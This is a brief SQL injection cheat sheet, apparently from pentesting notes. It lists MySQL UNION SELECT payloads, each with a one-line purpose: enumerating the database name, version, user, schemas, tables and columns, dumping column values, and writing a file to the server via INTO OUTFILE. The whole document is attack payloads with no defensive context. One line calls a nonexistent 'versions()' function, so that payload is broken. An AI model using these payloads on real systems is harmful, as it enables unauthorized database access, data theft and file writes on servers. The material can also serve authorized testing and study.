
---

```mysql
'user input' UNION SELECT column1, column2, columnN, database()
```
Enumerate database name.

---

```mysql
'user input' UNION SELECT column1, column2, columnN, versions()
```
Enumerate database version.

---

```mysql
'user input' UNION SELECT column1, column2, columnN, user()
```
Enumerate the user running the database.

---

```mysql
'user input' UNION SELECT schema_name FROM information_schema.schemata -- -
```
Enumerate alternatives databases.

---

```mysql
'user input' UNION SELECT table_name FROM information_schema.tables WHERE table_schema="database name"-- -
```
Enumerate tables.

--- 

```mysql
'user input' UNION SELECT column_name FROM information_schema.columns WHERE table_schema="database name" AND table_name="table name"
```
Enumerate columns.

--- 

```mysql
'user input' UNION SELECT group_concat(column1,0x3a,column2) FROM <TABLE_NAME> -- -
```
Enumerate values of specific columns.

---

```mysql
'user input' UNION SELECT "content" INTO OUTFILE "/path/filename.txt"-- -
```
Save content in system path.

